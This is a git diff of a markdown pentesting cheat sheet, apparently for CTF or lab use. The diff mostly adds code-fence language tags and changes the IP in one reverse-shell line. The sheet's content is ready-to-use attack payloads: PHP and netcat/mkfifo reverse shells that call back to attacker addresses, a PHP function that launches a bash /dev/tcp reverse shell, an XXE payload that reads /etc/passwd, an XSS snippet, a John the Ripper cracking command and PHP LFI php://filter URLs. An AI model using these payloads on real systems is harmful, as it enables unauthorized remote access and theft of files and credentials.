@@ -10,7 +10,7 @@
 
 # Reverse Shell
 - php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-- m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.2.77 9001 >/tmp/f
+- m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.2.97 9001 >/tmp/f
 
 # Blind OS injection
 ```sh
@@ -21,20 +21,26 @@
 
 # XXE Attacks
 
-```
+```html
 <?xml version="1.0"?>
 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
 <root>&read;</root>
 
 ```
 # XSS payloads
-```
+
+```js
 <script>onclick(alert("Hello"));</script>
 // window.location.hostname
+
 ```
 
 # John Hashing
+
+```sh
+
 - john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
+```
 
 # Encryption gpg
 - gpg --cipher-algo [encryption type] [encryption method] [file to encrypt] 
@@ -53,6 +59,8 @@
 -   email_re = re.compile(r'([a-zA-Z0-9_\+\-\.]+)@(([[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)')
 
 ## Php reverse shell function
+```php
+
 function execInBackground($cmd) { 
                 if (substr(php_uname(), 0, 7) == "Windows"){ 
                                     pclose(popen("start /B ". $cmd, "r"));  
@@ -62,6 +70,8 @@ function execInBackground($cmd) {
                                                                                                             } 
                                                                                                                             } 
                                                                                                                                         execInBackground("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_HERE/YOUR_PORT_HERE 0>&1'");
+
+```
 # PHP LFI
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
